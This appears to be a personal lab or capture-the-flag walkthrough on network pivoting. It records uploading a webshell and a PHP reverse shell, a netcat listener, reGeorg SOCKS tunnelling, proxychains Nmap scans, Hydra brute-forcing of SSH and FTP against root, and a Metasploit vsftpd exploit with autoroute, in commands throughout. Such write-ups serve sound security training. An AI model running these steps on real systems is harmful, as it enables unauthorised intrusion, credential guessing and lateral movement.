# Pivoting IX

# Steps Taken:
#### 1. Scanning the first target machine:

#### 2. Enumerating directories on the webpage through the use of dirbuster:

![](/assets/img/1648.png)

		- Note that it is given to us where the link to login form in the first place: http://{ip}/?/admin

- Checking where the uploaded files land:

#### 3. Upload a simple webshell:

![](/assets/img/1650.png)

#### 4. Using the webshell to interact with the web server:

![](/assets/img/1651.png)

#### 5. Taking advantage of the web shell to acquire a reverse shell so we upload a php-reverse-shell.php:

![](/assets/img/1652.png)

#### 6. Using the uploaded reverse shell:

		- First, create a netcat listener with: nc -lvnp 8080

![](/assets/img/1653.png)

		- Second, execute it by going to: http://192.73.87.3/public/php-reverse-shell.php
		- Note that this php file is modified so that it will connect to this port 8080 listener on the client machine.

	- You'd notice that the webpage is loading meaning, the file got executed and is on a process.

**Netcat perspective**:

#### 7. Find the flag in this compromised machine:
```bash
find / -name *flag*
```

![](/assets/img/1656.png)

#### 8. Get the flag:
```bash
cat /tmp/flag1.txt
```

#### 9. Make this compromised machine a pivot to the internal network to reach internal network machines through the use of reGeorg:

		- Go to: ~/Desktop/tools/reGeorg/php/

![](/assets/img/1657.png)

#### 10. In this directory, you can see the "tunnel.php" file. Upload this on the webpage. This is used to tunnel from the webserver to the internal network where the webserver is connected!

#### 11. Now that you uploaded the php file, you can use the python code to create a SOCKS proxy server for the attacker machine to be able to reach the internal network machines:

```bash
python reGeorgeSocksProxy.py -p 9050 -u http://{ip}/public/tunnel.php
```
#### 12. Now, NMAP with proxychains the internal machine:
```bash
proxychains nmap -sT -Pn {target-ip-internal}
```
		- This shows that there are 2 ports open: port 22(SSH) and port 21(FTP)
		- We know that we can both bruteforce them with Hydra so we do those in parallel.

#### 13. Bruteforcing SSH and FTP
```bash
proxychains hydra 192.121.141.3 ssh -t 4 -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt -f -V
```
```bash
proxychains hydra 192.121.141.3 ftp -t 4 -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt -f -V
```
		- Note that you can do both on separate terminal to do them in parallel!

#### 14. While doing so, you can also look for exploit for these services in Metasploit. The thing is, we connected to the web server via webshell and then upgraded to a bash reverse shell. Is there a way to do so in Metasploit?

		- Now ,we use the exploit/multi/handler which basically is like the "nc -lvnp 8080" command done. This just listens for connection coming from the compromised webserver.

		- Of course, I initialize the postgresql database first:
```bash
# service postgresql start
# msfdb init
# msfconsole -q
msf > db_status
```

![](/assets/img/1660.png)

	- Note that it connected AFTER executing the php-reverse-shell.php AGAIN on the /public/php-reverse-shell.php on the webserver!

#### 15. Reflection:

		- It seems that bruteforcing FTP and SSH services are taking so long, let's try to find exploit in Metasploit for FTP.

#### 16. Using FTP exploit from metasploit:
```bash
		msf > search vsftpd
```

![](/assets/img/1661.png)

	- Notice that I upgraded the reverse shell acquired as well!

![](/assets/img/1662.png)

	- Here's the interface for the internal network where the web server is connected to.

#### 17. Creating another pivot on the compromised machine to be able to send the exploit to the internal network machine with **autoroute**:

![](/assets/img/1663.png)

#### 18. Check again if the SOCKS proxy server is there:

![](/assets/img/1664.png)

	- It is there with port 9050 and is being run on python which is the reGeorgSocksProxy.py!
	- At this point, I don't think the SOCKS proxy is necessary at this point since another pivot was created with Metasploit in the first place and usage of proxychains is unnecessary.
	
#### 19. Trying the FTP exploit:

![](/assets/img/1665.png)

#### 20. Exploiting the internal machine with the FTP exploit:

![](/assets/img/1666.png)

#### 21. Finding the flag and taking it:
```bash
find / -name *flag*
```
```bash
cat /usr/bin/flag1.txt
```
